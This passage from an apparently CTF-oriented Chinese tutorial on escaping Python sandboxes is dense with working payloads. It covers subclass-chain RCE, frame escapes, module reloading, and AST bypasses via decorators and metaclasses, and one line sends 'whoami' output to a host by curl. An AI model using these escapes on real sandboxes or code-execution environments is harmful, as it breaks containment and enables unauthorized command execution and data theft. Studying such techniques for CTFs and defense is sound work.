                        &#x27;user&#x27;, &#x27;uu&#x27;, &#x27;webbrowser&#x27;, &#x27;whichdb&#x27;, &#x27;zipfile&#x27;, &#x27;zipimport&#x27;]
    for forbid in module_blacklist:
        if name == forbid:        # don&#x27;t let user import these modules
            raise RuntimeError(&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;.format(forbid))
    # normal modules can be imported
    return __import__(name, *args, **kwargs)

def sandbox_exec(command):      # sandbox user input
    result = 0
    __sandboxed_builtins__ = dict(__builtins__.__dict__)
    __sandboxed_builtins__[&#x27;__import__&#x27;] = _hook_import_    # hook import
    del __sandboxed_builtins__[&#x27;open&#x27;]
    _global = &#123;
        &#x27;__builtins__&#x27;: __sandboxed_builtins__
    &#125;

    ...
        exec command in _global     # do calculate in a sandboxed  
    ...</code></pre>
<ol>
<li>沙箱首先获取 <code>__builtins__</code>，然后依据现有的 <code>__builtins__</code> 来构建命名空间。</li>
<li>修改 <code>__import__</code> 函数为自定义的<code>_hook_import_</code></li>
<li>删除 open 函数防止文件操作</li>
<li>exec 命令。</li>
</ol>
<p>绕过方式：</p>
<p>由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的 <code>__builtins__</code>（这个<code>__builtins__</code>保存的就是原始<code>__builtins__</code>的引用），比如 types 库，来执行任意命令：</p>
<pre><code class="highlight plaintext">__import__(&#x27;types&#x27;).__builtins__
__import__(&#x27;string&#x27;).__builtins__</code></pre>
<h3 id="继承链no-builtins"><a class="markdownIt-Anchor" href="#继承链no-builtins"></a> 继承链(no builtins)</h3>
<p>什么?<code>builtins</code>被清光了?没事我有继承链</p>
<p>poc原理和SSTI相似，就是利用父类和子类之间的继承关系，不断访问内部属性来达到调用，实现文件读取或者RCE的效果</p>
<p><strong>前提是没有把attribute给你禁掉，禁掉之后这种方法就行不通了</strong></p>
<p>没禁掉的情况基本无敌吧大概</p>
<p><strong>RCE</strong></p>
<pre><code class="highlight plaintext"># os
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;ls&quot;)

# subprocess 
[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__ == &#x27;Popen&#x27;][0](&#x27;ls&#x27;)

# builtins
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;]

# help
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;][&#x27;help&#x27;]

[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&#x27;__builtins__&#x27;]

#sys
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;sys&quot; in x.__init__.__globals__ ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)

[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;_sitebuiltins.&quot; in str(x) and not &quot;_Helper&quot; in str(x) ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)

#commands (not very common)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;commands&quot; in x.__init__.__globals__ ][0][&quot;commands&quot;].getoutput(&quot;ls&quot;)

#pty (not very common)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pty&quot; in x.__init__.__globals__ ][0][&quot;pty&quot;].spawn(&quot;ls&quot;)

#importlib
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)

#imp
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)

#pdb
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pdb&quot; in x.__init__.__globals__ ][0][&quot;pdb&quot;].os.system(&quot;ls&quot;)

# ctypes
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;ctypes&#x27;).CDLL(None).system(&#x27;ls /&#x27;.encode())

# multiprocessing
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;multiprocessing&#x27;).Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()</code></pre>
<p><strong>File</strong></p>
<pre><code class="highlight plaintext">[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;FileLoader&quot; ][0].get_data(0,&quot;/etc/passwd&quot;)</code></pre>
<h3 id="栈帧逃逸"><a class="markdownIt-Anchor" href="#栈帧逃逸"></a> 栈帧逃逸</h3>
<p>先了解一些概念吧。</p>
<p><strong>栈帧</strong></p>
<p><strong>生成器</strong></p>
<p>生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。</p>
<p>在 Python 中，生成器可以使用 yield 关键字来定义。yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束。</p>
<pre><code class="highlight python"><span class="keyword">def</span> <span class="title function_">f</span>():
    a=<span class="number">1</span>
    <span class="keyword">while</span> <span class="literal">True</span>:
        <span class="keyword">yield</span> a
        a+=<span class="number">1</span>
f=f()
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#1</span>
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#2</span>
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#3</span>
<span class="built_in">next</span>() 函数在Python中用于获取迭代器的下一个元素

<span class="comment">#生成器表达式:</span>
 gen_exp = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))

 <span class="keyword">for</span> num <span class="keyword">in</span> gen_exp:
     <span class="built_in">print</span>(num)
<span class="comment">#类似于列表推导式，但使用小括号 () 而不是方括号 [] 来创建生成器表达式</span></code></pre>
<p><strong>生成器属性</strong></p>
<p><code>gi_code</code>: 生成器对应的code对象。<br>
<code>gi_frame</code>: 生成器对应的frame（栈帧）对象。<br>
<code>gi_running</code>: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。<br>
<code>gi_yieldfrom</code>：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。<br>
<code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
<p><strong>着重介绍一下 gi_frame 属性</strong><br>
<code>gi_frame</code> 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。</p>
<p>下面是一个简单的示例，演示了如何使用生成器的 gi_frame 属性来获取生成器的当前帧信息:</p>
<pre><code class="highlight python"><span class="keyword">def</span> <span class="title function_">my_generator</span>():
    <span class="keyword">yield</span> <span class="number">1</span>
    <span class="keyword">yield</span> <span class="number">2</span>
    <span class="keyword">yield</span> <span class="number">3</span>

gen = my_generator()

<span class="comment"># 获取生成器的当前帧信息</span>
frame = gen.gi_frame

<span class="comment"># 输出生成器的当前帧信息</span>
<span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, frame.f_locals)
<span class="built_in">print</span>(<span class="string">&quot;Global Variables:&quot;</span>, frame.f_globals)
<span class="built_in">print</span>(<span class="string">&quot;Code Object:&quot;</span>, frame.f_code)
<span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</code></pre>
<p><strong>栈帧(frame)</strong></p>
<p>在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
<p>栈帧包含了以下几个重要的属性：<br>
<code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br>
<code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br>
<code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br>
<code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。<br>
<code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈</p>
<h4 id="生成器栈帧逃逸"><a class="markdownIt-Anchor" href="#生成器栈帧逃逸"></a> <strong>生成器栈帧逃逸</strong></h4>
<p>原理其实就是生成器的栈帧对象通过<code>f_back</code>不断返回前一帧从而去获取<code>globals</code>全局符号表</p>
<pre><code class="highlight python">s3cret=<span class="string">&quot;this is flag&quot;</span>
<span class="keyword">def</span> <span class="title function_">f</span>():
        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back

g = f().gi_frame  <span class="comment">#生成器</span>
<span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, g.f_globals)</code></pre>
<p>在这里其实就可以看到成功逃出</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102803052.png" alt="image-20250506102803052"></p>
<p>而查看locals时就会发现是空列表</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102848722.png" alt="image-20250506102848722"></p>
<p>模拟一下沙箱的操作</p>
<pre><code class="highlight python">codes=<span class="string">&#x27;&#x27;&#x27;</span>
<span class="string">def waff():</span>
<span class="string">    def f():</span>
<span class="string">        yield g.gi_frame.f_back</span>
<span class="string"></span>
<span class="string">    g = f()  #生成器</span>
<span class="string">    frame = next(g) #获取到生成器的栈帧对象</span>
<span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span>
<span class="string">    return b</span>
<span class="string">b=waff()</span>
<span class="string">&#x27;&#x27;&#x27;</span>
<span class="built_in">locals</span>=&#123;&#125;
code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)
<span class="built_in">exec</span>(code,<span class="built_in">locals</span>)
<span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])
<span class="comment">#使用next获取到的就是yield定义的值，这里获取到的就是g.gi_frame.f_back</span>
<span class="comment">#使用g.gi_frame.f_back的话，那么g = f()就必须为g，用的就是这个生成器对象的栈帧</span>
<span class="comment">#compile(codes, &quot;test&quot;, &quot;exec&quot;)就是设置了名称为test的python沙箱环境</span></code></pre>
<p>运行得到 <code>this is flag</code> ,成功逃逸出沙箱获取到<code>s3cret</code>变量值</p>
<p>这里也可以使用<code>f_locals</code>去代替<code>f_globals</code>效果是相同的，但是要注意，<code>locals</code>返回的是局部符号表，它包含了在当前函数或方法内部定义的变量。这些局部变量只在当前函数或方法的执行过程中存在，并且只能在该函数或方法内部访问。当函数执行完毕后，这些局部变量就会被销毁。</p>
<p>怎么用呢，可以用来配合修改函数；也可以拿<code>_globals</code>反打rce</p>
<pre><code class="highlight plaintext">2024L3HCTF 打int函数返回值 参考链接:https://xz.aliyun.com/news/13075</code></pre>
<h4 id="异常栈帧逃逸"><a class="markdownIt-Anchor" href="#异常栈帧逃逸"></a> <strong>异常栈帧逃逸</strong></h4>
<p>通过主动抛出异常+抓抛出错误的栈帧来逃逸沙箱</p>
<p>给一串简单的实例:</p>
<pre><code class="highlight python"><span class="keyword">try</span>:
    <span class="number">1</span>/<span class="number">0</span>
<span class="keyword">except</span> Exception <span class="keyword">as</span> e:
    frame=e.__traceback__.tb_frame
    builtins=frame.f_globals[<span class="string">&#x27;__builtins__&#x27;</span>]
    builtins.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250603194452776.png" alt="image-20250603194452776"></p>
<p>可以看到成功执行了。</p>
<h4 id="异步栈帧逃逸"><a class="markdownIt-Anchor" href="#异步栈帧逃逸"></a> 异步栈帧逃逸</h4>
<pre><code class="highlight python"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">a</span>():
    <span class="keyword">pass</span>
a().cr_frame.f_globals</code></pre>
<h3 id="变量覆盖与函数篡改"><a class="markdownIt-Anchor" href="#变量覆盖与函数篡改"></a> 变量覆盖与函数篡改</h3>
<p>优雅啊，很优雅啊。。</p>
<p>这里简单一些的就是给出blacklist但是是可控的，可以直接改变量然后直接执行命令就可以了</p>
<p>在 Python 中，sys 模块提供了许多与 Python 解释器和其环境交互的功能，包括对全局变量和函数的操作。在沙箱中获取 sys 模块就可以达到变量覆盖与函数擦篡改的目的.</p>
<p>sys.modules 存放了现有模块的引用, 通过访问 <code>sys.modules['__main__']</code> 就可以访问当当前模块定义的所有函数以及全局变量</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; aaa = &#x27;bbb&#x27;
&gt;&gt;&gt; def my_input():
...     dict_global = dict()
...     while True:
...       try:
...           input_data = input(&quot;&gt; &quot;)
...       except EOFError:
...           print()
...           break
...       except KeyboardInterrupt:
...           print(&#x27;bye~~&#x27;)
...           continue
...       if input_data == &#x27;&#x27;:
...           continue
...       try:
...           complie_code = compile(input_data, &#x27;&lt;string&gt;&#x27;, &#x27;single&#x27;)
...       except SyntaxError as err:
...           print(err)
...           continue
...       try:
...           exec(complie_code, dict_global)
...       except Exception as err:
...           print(err)
... 
&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;]
&lt;module &#x27;__main__&#x27; (built-in)&gt;
&gt;&gt;&gt; dir(sys.modules[&#x27;__main__&#x27;])
[&#x27;__annotations__&#x27;, &#x27;__builtins__&#x27;, &#x27;__doc__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;aaa&#x27;, &#x27;my_input&#x27;, &#x27;sys&#x27;]
&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;].aaa
&#x27;bbb&#x27;</code></pre>
<p>除了通过 sys 模块来获取当前模块的变量以及函数外,还可以通过 <code>__builtins__</code>篡改内置函数等,这只是一个思路.</p>
<p>总体来说,只要获取了某个函数或者变量就可以篡改, 难点就在于获取.</p>
<h4 id="利用-gc-获取已删除模块"><a class="markdownIt-Anchor" href="#利用-gc-获取已删除模块"></a> 利用 gc 获取已删除模块</h4>
<p>这个思路来源于 <a target="_blank" rel="noopener" href="https://github.com/fab1ano/hxp-ctf-20/tree/master/audited">writeup by fab1ano – github</a></p>
<p>这道题的目标是覆盖 <code>__main__</code> 中的 <code>__exit</code> 函数,但是题目将 <code>sys.modules['__main__']</code> 删除了,无法直接获取.</p>
<pre><code class="highlight plaintext">for module in set(sys.modules.keys()):
    if module in sys.modules:
        del sys.modules[module]</code></pre>
<p><code>gc</code> 是Python的内置模块，全名为”garbage collector”，中文译为”垃圾回收”。<code>gc</code> 模块主要的功能是提供一个接口供开发者直接与 Python 的垃圾回收机制进行交互。</p>
<p>Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。<code>gc</code> 模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。</p>
<p>下面是一些 <code>gc</code> 模块中的主要函数：</p>
<ol>
<li><code>gc.collect(generation=2)</code>：这个函数会立即触发一次垃圾回收。你可以通过 <code>generation</code> 参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。</li>
<li><code>gc.get_objects()</code>：这个函数会返回当前被管理的所有对象的列表。</li>
<li><code>gc.get_referrers(*objs)</code>：这个函数会返回指向 <code>objs</code> 中任何一个对象的对象列表。</li>
</ol>
<p>exp 如下</p>
<pre><code class="highlight plaintext">for obj in gc.get_objects():
    if &#x27;__name__&#x27; in dir(obj):
        if &#x27;__main__&#x27; in obj.__name__:
            print(&#x27;Found module __main__&#x27;)
            mod_main = obj
        if &#x27;os&#x27; == obj.__name__:
            print(&#x27;Found module os&#x27;)
            mod_os = obj
mod_main.__exit = lambda x : print(&quot;[+] bypass&quot;)</code></pre>
<p>在 3.11 版本和 python 3.8.10 版本中测试发现会触发 gc.get_objects hook 导致无法成功.</p>
<h4 id="利用-traceback-获取模块"><a class="markdownIt-Anchor" href="#利用-traceback-获取模块"></a> 利用 traceback 获取模块</h4>
<p>这个思路来源于 <a target="_blank" rel="noopener" href="https://github.com/hstocks/ctf_writeups/blob/master/2020/hxp/audited/README.md">writeup by hstocks – github</a></p>
<p>主动抛出异常, 并获取其后要执行的代码, 然后将<code>__exit</code> 进行替换, 思路也是十分巧妙.</p>
<pre><code class="highlight plaintext">try:
    raise Exception()
except Exception as e:
    _, _, tb = sys.exc_info()
    nxt_frame = tb.tb_frame

    # Walk up stack frames until we find one which
    # has a reference to the audit function
    while nxt_frame:
        if &#x27;audit&#x27; in nxt_frame.f_globals:
            break
        nxt_frame = nxt_frame.f_back

    # Neuter the __exit function
    nxt_frame.f_globals[&#x27;__exit&#x27;] = print

    # Now we&#x27;re free to call whatever we want
    os.system(&#x27;cat /flag*&#x27;)</code></pre>
<p>但是实际测试时使用 python 3.11 发现 <code>nxt_frame = tb.tb_frame</code> 会触发 <code>object.__getattr__</code> hook. 不同的版本中触发 hook 的地方会有差异,这个 payload 可能仅在 python 3.9 (题目版本)中适用</p>
<h3 id="模块重载原module被篡改"><a class="markdownIt-Anchor" href="#模块重载原module被篡改"></a> 模块重载(原module被篡改)</h3>
<p>为什么要<strong>重载</strong>呢？因为目标模块/方法在一开始就被<strong>删除/覆盖</strong>了，但是通过一些手段，就可以重新加载这些模块</p>
<pre><code class="highlight bash">&gt;&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
&lt;built-in <span class="keyword">function</span> <span class="built_in">eval</span>&gt;
&gt;&gt;&gt; del __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
&gt;&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
Traceback (most recent call last):
  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;
KeyError: <span class="string">&#x27;eval&#x27;</span></code></pre>
<h4 id="reload-重新加载"><a class="markdownIt-Anchor" href="#reload-重新加载"></a> reload 重新加载</h4>
<p>reload函数在不同版本中的位置不同</p>
<pre><code class="highlight plaintext">Python 2.x
&gt;&gt;&gt;reload(module)

Python 2.x-3.3
&gt;&gt;&gt;import imp
&gt;&gt;&gt;impo.reload(module)

Python 3.4-latest
&gt;&gt;&gt;import importlib
&gt;&gt;&gt;importlib.reload(module)</code></pre>
<p>reload 函数可以重新加载模块，这样被删除的函数能被重新加载</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
&lt;built-in function eval&gt;
&gt;&gt;&gt; del __builtins__.__dict__[&#x27;eval&#x27;]
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
KeyError: &#x27;eval&#x27;
&gt;&gt;&gt; reload(__builtins__)
&lt;module &#x27;__builtin__&#x27; (built-in)&gt;
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
&lt;built-in function eval&gt;</code></pre>
<p>在 Python 3 中，reload() 函数被移动到 <code>importlib</code> 模块中，所以如果要使用 reload() 函数，需要先导入<code> importlib</code> 模块。</p>
<p>貌似新版本的 python 即使运行了<code> importlib.reload</code> 也无法恢复了。</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; importlib.reload(__builtins__)
&lt;module &#x27;builtins&#x27; (built-in)&gt;
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
KeyError: &#x27;eval&#x27;</code></pre>
<h4 id="恢复-sysmodules"><a class="markdownIt-Anchor" href="#恢复-sysmodules"></a> 恢复 <code>sys.modules</code></h4>
<p>一些过滤中可能将 <code>sys.modules['os']</code> 进行修改. 这个时候即使将 <code>os</code> 模块导入进来,也是无法使用的.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;
&gt;&gt;&gt; __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;</code></pre>
<p>由于很多别的命令执行库也使用到了 os,因此也会受到相应的影响,例如 subprocess</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __import__(&#x27;subprocess&#x27;).Popen(&#x27;whoami&#x27;, shell=True)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;, line 688, in &lt;module&gt;
    class Popen(object):
  File &quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;, line 1708, in Popen
    def _handle_exitstatus(self, sts, _WIFSIGNALED=os.WIFSIGNALED,
AttributeError: &#x27;str&#x27; object has no attribute &#x27;WIFSIGNALED&#x27;</code></pre>
<p>由于 import 导入模块时会检查 sys.modules 中是否已经有这个类，如果有则不加载,没有则加载.因此我们只需要将 os 模块删除,然后再次导入即可.</p>
<pre><code class="highlight plaintext">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27; # oj 为你加的

del sys.modules[&#x27;os&#x27;]
import os
os.system(&#x27;ls&#x27;)</code></pre>
<h4 id="globals"><a class="markdownIt-Anchor" href="#globals"></a> globals()</h4>
<p>有些时候沙箱会设置</p>
<pre><code class="highlight plaintext">def blacklist_fun_callback(*args):
    print(&quot;Player! It&#x27;s already banned!&quot;)

vars = blacklist_fun_callback
attr = blacklist_fun_callback
dir = blacklist_fun_callback
getattr = blacklist_fun_callback
exec = blacklist_fun_callback
__import__ = blacklist_fun_callback
compile = blacklist_fun_callback</code></pre>
<p>来覆盖内置函数，限制函数的使用。</p>
<p>但是<code>builtins</code>是一个不可变的模块对象，这样修改仅能够在当前的作用域中生效，而 globals() 中存放了 builtins 模块的索引，因此可以通过下面的方式获取到原始的方法。</p>
<pre><code class="highlight plaintext">globals()[&quot;__builtins__&quot;][&#x27;breakpoint&#x27;]</code></pre>
<p>但是题目如果使用了下面的方式来删除，那就没有办法了，即使 reload 重新导入 <code>builtins</code> 模块，较新版本的 python 中也无法恢复。</p>
<pre><code class="highlight plaintext">del globals()[&quot;__builtins__&quot;].breakpoint</code></pre>
<h3 id="ast"><a class="markdownIt-Anchor" href="#ast"></a> AST</h3>
<p>AST 沙箱会将用户的输入转化为操作码,此时字符串层面的变换基本上没用了,一般情况下考虑绕过 AST 黑名单. 例如下面的沙箱禁止了 <code>ast.Import|ast.ImportFrom|ast.Call</code> 这三类操作, 这样一来就无法导入模块和执行函数.</p>
<pre><code class="highlight plaintext">import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print(&quot;-- Please enter code (last line must contain only --END)&quot;)
source_code = &quot;&quot;
while True:
  line = sys.stdin.readline()
  if line.startswith(&quot;--END&quot;):
    break
  source_code += line

tree = compile(source_code, &quot;input.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print(&quot;-- Executing safe code:&quot;)
  compiled = compile(source_code, &quot;input.py&quot;, &#x27;exec&#x27;)
  exec(compiled)</code></pre>
<p>下面的 without call 来源于 hacktricks</p>
<h4 id="without-call"><a class="markdownIt-Anchor" href="#without-call"></a> without call</h4>
<p>如果基于 AST 的沙箱限制了执行函数,那么就需要找到一种不需要执行函数的方式执行系统命令.</p>
<h5 id="装饰器"><a class="markdownIt-Anchor" href="#装饰器"></a> <strong>装饰器</strong></h5>
<p>利用 payload 如下，乍一看可能有些迷惑，但该 payload 实际上等效于 exec(input(X))</p>
<pre><code class="highlight plaintext">@exec
@input
class X:
    pass</code></pre>
<p>当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; @exec
... @input
... class X:
...     pass
... 
&lt;class &#x27;__main__.X&#x27;&gt;__import__(&quot;os&quot;).system(&quot;ls&quot;)</code></pre>
<p>由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 input 接收的, 因此也不会被拦截.</p>
<p>其实这样的话,构造其实可以有很多,比如使用单层的装饰器，打开 help 函数.</p>
<pre><code class="highlight plaintext">@help
class X:
    pass</code></pre>
<p>这样可以直接进入帮助文档:</p>
<pre><code class="highlight plaintext">Help on class X in module __main__:

class X(builtins.object)
 |  Data descriptors defined here:
 |  
 |  __dict__
 |      dictionary for instance variables (if defined)
 |  
 |  __weakref__
 |      list of weak references to the object (if defined)
(END)</code></pre>
<p>再次输入 !sh 即可打开 /bin/sh</p>
<p>或是给装饰器加一些参数。</p>
<pre><code class="highlight plaintext">import os

def fake_wrapper(f):
  return &#x27;/bin/sh&#x27;

@getattr(os,&quot;system&quot;)
@fake_wrapper
def something():
  pass</code></pre>
<p>相当于：</p>
<pre><code class="highlight plaintext">getattr(os,&quot;system&quot;)(fake_wrapper(something))</code></pre>
<p>亦或者自定义一个装饰器：</p>
<pre><code class="highlight plaintext">import os

def fake_wrapper(f):
  return &#x27;/bin/sh&#x27;

@os.system
@fake_wrapper
def something():
  pass</code></pre>
<p>相当于 <code>os.system(fake_wrapper(something))</code>，也就是 <code>os.system(‘/bin/sh’)</code></p>
<h5 id="函数覆盖"><a class="markdownIt-Anchor" href="#函数覆盖"></a> <strong>函数覆盖</strong></h5>
<p>我们知道在 Python 中获取一个的属性例如 <code>obj[argument]</code> 实际上是调用的 <code>obj.__getitem__</code> 方法.因此只需要覆盖其 <code>__getitem__</code> 方法, 即可在使用 <code>obj[argument]</code> 执行代码:</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; class A:
...     __getitem__ = exec
... 
&gt;&gt;&gt; A()[&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;]</code></pre>
<p>但是这里调用了 A 的构造函数, 因此 AST 中还是会出现 <code>ast.Call</code>. 如何在不执行构造函数的情况下获取类实例呢?</p>
<p><strong><code>metaclass</code> 利用</strong></p>
<p>Python 中提供了一种元类(<code>metaclass</code>)概念。元类是创建类的“类”。在 Python中，类本身也是对象，元类就是创建这些类（即类的对象）的类。</p>
<p>元类在 Python 中的作用主要是用来创建类。类是对象的模板，而元类则是类的模板。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。</p>
<p>下面是基于元类的 payload, 在不使用构造函数的情况下触发</p>
<pre><code class="highlight plaintext">class Metaclass(type):
    __getitem__ = exec 
    
class Sub(metaclass=Metaclass):
    pass

Sub[&#x27;import os; os.system(&quot;sh&quot;)&#x27;]</code></pre>
<p>除了 <code>__getitem__</code> 之外其他方法的利用方式如下:</p>
<pre><code class="highlight plaintext">__sub__ (k - &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__mul__ (k * &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__floordiv__ (k // &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__truediv__ (k / &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__mod__ (k % &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__pow__ (k**&#x27;import os; os.system(&quot;sh&quot;)&#x27;)
